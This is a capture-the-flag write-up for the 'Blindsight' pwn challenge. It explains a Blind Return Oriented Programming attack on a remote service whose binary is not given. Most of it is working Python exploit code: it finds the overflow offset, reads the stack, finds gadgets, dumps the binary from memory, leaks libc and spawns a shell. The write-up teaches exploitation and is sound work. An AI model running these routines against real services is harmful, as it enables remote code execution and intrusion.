# D-CTF pwn Blindsight
---
By Tomiyoka Giyu
- [Description](#Desciption)
- [BROP](#BROP)
- [Exploit](#Exploit)
- [Final Exploit](#Final_Exploit)
- [Resources](#Resources)

## Description
- Challenge name: Blindsight
- Solves:38 pts: 236
So we are provided a IP, port and a libc file in this challenge. When we execute in remote with:-
```text
$ nc 34.159.129.6 30550
```
![Executed file](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/7e5d41a7f19d421e4dca4e3af2d6b372ac2d292f/Screenshot%20from%202022-02-14%2012-50-52.png?raw=true)
So first it's print ***Are you blind my friend?*** then ***ask for input*** and then print ***No password for you***
But if are input is too long then it doesn't print anything like this:-
![When input is too long](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/55cc39f65bb5bf0c018b942ecbfb640f0a99413c/Screenshot%20from%202022-02-14%2013-08-24.png?raw=true)

So it's a stack oveflow. Since we don't have a binary and know there is a stackoverflow then the only attack we can perform is BROP

## BROP
BROP a.k.a _Blind Return Oriented Programming_. Let see what it is:- 
```text
When hacking software, there are three exploit scenarios:

    Open-source (e.g., Apache)
    Open-binary (e.g., Internet Explorer)
    Closed-binary and source (e.g., some proprietary network service)

This work studies whether it is possible to attack the third case.

The BROP attack makes it possible to write exploits without possessing the target's binary. It requires a stack overflow and a service that restarts after a
crash. Based on whether a service crashes or not (i.e., connection closes or stays open), the BROP attack is able to construct a full remote exploit that leads to
a shell. The BROP attack remotely leaks enough gadgets to perform the write system call, after which the binary is transferred from memory to the attacker's
socket. Following that, a standard ROP attack can be carried out. Apart from attacking proprietary services, BROP is very useful in targeting open-source software
for which the particular binary used is not public (e.g., installed from source setups, Gentoo boxes, etc.).
```
So it's perfect for us let see the step of exploitation:- 

 - Break ASLR by "stack reading" a return address (and canaries).
 - Find a "stop gadget" which halts ROP chains so that other gadgets can be found.
 - Find the BROP gadget which lets you control the first two arguments of calls.
 - Find a call to strcmp, which as a side effect sets the third argument to calls (e.g., write length) to a value greater than zero.
 - Find a call to write.
 - Write the binary from memory to the socket.
 - Dump the symbol table from the downloaded binary to find calls to dup2, execve, and build shellcode.
***We will modify the each step according to our requirement but this is the basic layout.***
SO let's Go to [Exploit](#Exploit)
## Exploit
- Note:- The code provided here are just snippets to execute everything successfully GO to [Final Exploit](#Final_Exploit)
### Finding Stack overflow offset
The first is to find the vulnerability of the stack overflow, the old way is to start with 1 character, brute force enumeration, until it crashes.
```python
def get_buffer_size():
     for i in range(100):
        payload  = "A"
        payload += "A"*i
        buf_size = len(payload) - 1
        try:
            p = remote(HOST, PORT)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size
```
```text
[+] Buffer size: 88
```
EOFError will only happen when our payload will write the rip or canary that means the correct size of buffer will be len(payload) -1
### Stack reading for canary
Stack reading is a process in which we bruteforce the canary and rip byte by byte with every possible value i.e from 0x0 to 0xff if no crash happens that means the byte value is right and we will add that byte in our ret_Address or canAary value
```python
def stack_address_leak(buf_size):
    context.log_level = 'error'
    my_list = []
    ret_Addr = ''
    guess = 0x0
    base = ''
    while len(my_list) < 8:
        guess = 0x0
        while guess != 0xff:
            sleep(0.1)
            payload  = "A"*buf_size
            if guess == 0xa:
                guess += 1
            payload = payload + ''.join(ret_Addr) + chr(guess)
            try:
                p = remote(HOST,PORT)
                p.recvline()
                p.send(payload)
                line = p.recv(30, timeout=2)
                if "No password" in line.decode():
                    ret_Addr += chr(guess)
                    my_list.append(guess)
                    #print("Return addrees:" + ret_Addr)
                    guess = 0x0
                    p.close()
                    break
                else:
                    guess += 1
                    p.close()
            except EOFError as e:
                p.close()
                #print("bad: 0x%x" % guess)
                guess += 1
            except KeyboardInterrupt:
                sys.exit(-2)
            except:
                log.info("Can't connect")
                guess -= 1
    return ret_Addr
```
Output:
```text
[+] Stack address:- 0x40070c
```
While Bruteforcing found there is **no canary** and the binary is compiled with **-no-pie** because the ret-address don't change
### Stop Gadget
Let see what a stop Gadget is:-
```text
A stop gadget is anything that
would cause the program to block, like an infinite loop or a
blocking system call (like sleep). To scan for useful gadgets,
one places the address being probed in the return address
```
But:- 
```text
Stop gadgets need not necessarily be gadgets that “stop”
the program. They are merely a signaling mechanism. For
example, a stop gadget could be one that forces a particular
write to the network so the attacker can tell whether the stop
gadget executed.
```
Let's put the stack address we got from previous step as stop_Gadget and run:- 
![](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/main/Screenshot%20from%202022-02-14%2014-04-18.png?raw=true)
- Well it's good enough if our payload will be correct then 'No password will be printed' else just crash
```text
[+] Stop Gadget:- 0x40070c
```
### Brop Gadget
Let's see what a Brop Gadget is:- 
```text
It's a special gadget present mostly in all bianries having 6 pops
i.e. pop rbx, pop rbp, pop r12, pop r13, pop r14, pop  r15 having 6 pop together is a rarity 
and it alwayas loaded after main that's why it quite easy to find and with the misalignment of 9 and 7 
we can transform it into "pop rdi, ret" and "pop rsi, pop r15, ret"
```
```python
def get_Brop_Gadget(stop_gadget, buff_size):
    context.log_level = 'error'
    addr = stop_gadget
    while True:
        sleep(0.1)
        addr += 1

        payload = b'A' * buff_size + p64(addr) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)
        try:
            p = remote(HOST,PORT)
            p.recvline()
            p.send(payload)
            line = p.recv(30, timeout=2)
            if b"No password" in line:
                if check_Brop_Gadget(buff_size, addr):
                    #print('Brop Gadget : ' + hex(addr))
                    p.close()
                    return addr
                else:
                    raise EOFError
            else:
                raise EOFError
        except EOFError as e:
                p.close()
                #print("bad: 0x%x" % addr)
        except Exception as e:
            print(e)
            print('Can\'t Connect')
            addr -= 1
```

There can be some false positive. So refer to check\_Brop\_Gadget source code in [Final Exploit](#Final_Exploit)

```text
[+] Brop Gadget:- 0x4007ba
```
### Finding puts@plt

This is an optimization from my side since today every modern day binary have puts and printf which require us to just control 1 regiter that is rdi to print everything and as we know that plt section is somewhat very near to our main function we can use our stop Gadget here also and plt entries are a multiple of 0x10 so it will be quite optimized bruteforced by itself

We will be printing the starting of .text section i.e. 0x400000 which always starts with \x7fELF. Now let's Go
```python
def get_puts_addr(buff_size, stop_gadget, brop_Gadget):
    context.log_level = 'error'
    addr = stop_gadget - 512
    addr -= addr % 16 # Aligning the address
    pop_rdi = brop_Gadget + 9 # Getting pop rdi by misalignment
    junk = b'A' * buff_size

    while True:
        payload = junk + p64(pop_rdi) + p64(0x400000) + p64(addr)
        try:
            io = remote(HOST, PORT)
            io.recvline()
            io.sendline(payload)
            content = io.recv()
            if b'\x7fELF' in content:
                print(content)
                return addr
            else:
                raise EOFError
        except EOFError as e:
            #print('Bad address: %x' % addr)
            addr += 0x10 # Since every entry is 0x10 bytes apart so adding 0x10 here
            io.close()
        except KeyboardInterrupt:
            sys.exit(-1)
        except Exception as e:
            print(e)
```
```text
Puts@plt address:- 0x400560
```
### Dump memory
Now we have mostly everything to dump the memory so let's do it
```python
def dump_memory(buf_size, stop_gadget, brop_Gadget, puts_plt, start_addr=0x400000, end_addr=0x400800):
    context.log_level = 'error'
    pop_rdi_ret = brop_Gadget + 9

    result = b''
    while start_addr < end_addr:
        sleep(1)
        payload = b'a' * buf_size
        payload += p64(pop_rdi_ret)
        payload += p64(start_addr)
        payload += p64(puts_plt)

        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.sendline(payload)
            resp = r.recv(timeout=1)

            if resp == b'\n':
                resp = b'\x00'
            elif resp[-1] == 0xa:
                resp = resp[:-1]
            elif resp == b'':
                resp = b'\x00'

            print('Leaking: 0x%x' % start_addr)
            result += resp
            start_addr += len(resp)
            r.close()
        except Exception as e:
            print(e)
            log.info("connect error")

    return result
```
Puts function is truncated by \x00 and add '\n' at the end of each line so we just remove 0xa or '\n'
and if nothing comes which is quite possible(and happened a lot) we just put \x00 byte there
Just dump the whole file in blind.dump like we did in [Final Exploit](#Final_Exploit)

### Selecting additional Gadgets
Just open the binary file with:-
```text
r2 -b 0x400000 ./blind.dump
```
Following are screenshots of blind.dump:- 
[Main function]
![](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/main/Screenshot%20from%202022-02-14%2014-48-58.png?raw=true)
[Plt section]
![](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/main/Screenshot%20from%202022-02-14%2014-50-51.png?raw=true)
So we are using these Gadgets:-
0x4006fb - call puts@plt
0x601018 - Got entry of puts
0x4006b6 - Main function starting

### Get the Shell
```python
def get_shell(buf_size, brop_Gadget, main_puts, got_Addr, main_start_address):
    pop_rdi = brop_Gadget +9
    payload = b'A' * buff_size + p64(pop_rdi) + p64(got_Addr) + p64(main_puts) + p64(main_start_address)
    print(payload)
    try:
        p = remote(HOST, PORT)
        p.recvline()
        #p.sendline()
        p.send(payload)
        data = p.recv()
        #print(data)
        leak = u64(data[:-1].ljust(8, b'\x00'))
        #print(hex(leak))
        libc.address = leak - libc.symbols['puts']
        print("Libc base address: 0x%x" % libc.address)
        binsh = libc.address + 0x18ce57
        payload2 = b'A' * buf_size + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])
        p.send(payload2)
        p.interactive()
    except Exception as e:
        print(e)
```
We are appending Main starting address to our payload so that we can again provide input to overwrite rip with shell address 

Now let's join everything in Final Exploit

## Final_Exploit
[Final Exploit](https://github.com/TomiyokaGiyu/Ctf-pictures/blob/main/final_exploit.py)

# Resource
[Standford edu papers on BROP](https://www.scs.stanford.edu/brop/bittau-brop.pdf)
